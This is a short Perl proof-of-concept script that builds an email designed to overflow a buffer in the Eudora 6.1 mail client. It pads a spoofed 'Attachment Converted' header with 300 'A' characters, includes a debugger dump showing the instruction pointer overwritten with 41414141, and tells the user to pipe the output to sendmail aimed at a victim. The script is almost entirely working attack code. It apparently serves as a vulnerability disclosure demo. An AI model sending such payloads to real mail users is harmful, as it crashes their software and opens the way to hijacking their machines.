#!/usr/bin/perl --
print "From: me\n";
print "To: you\n";
print "Subject: Eudora 6.1 buffer overflow demo\n";
print "X-Use: Pipe the output of this script into:  sendmail -i victim\n\n";
print "Long spoofed attachments cause an exploitable buffer overflow:\n";
# (298.40c): Access violation - code c0000005 (first chance)
# First chance exceptions are reported before any exception handling.
# This exception may be expected and handled.
# eax=800403e9 ebx=00000005 ecx=41414141 edx=00a22040 esi=00002966 edi=026a65b4
# eip=41414141 esp=0012f65c ebp=41414141 iopl=0         nv up ei ng nz ac pe cy
# cs=001b  ss=0023  ds=0023  es=0023  fs=0038  gs=0000             efl=00010293
# 41414141 ??               ???
print "Attachment Converted\r: ", "A"x300,"\n\n";
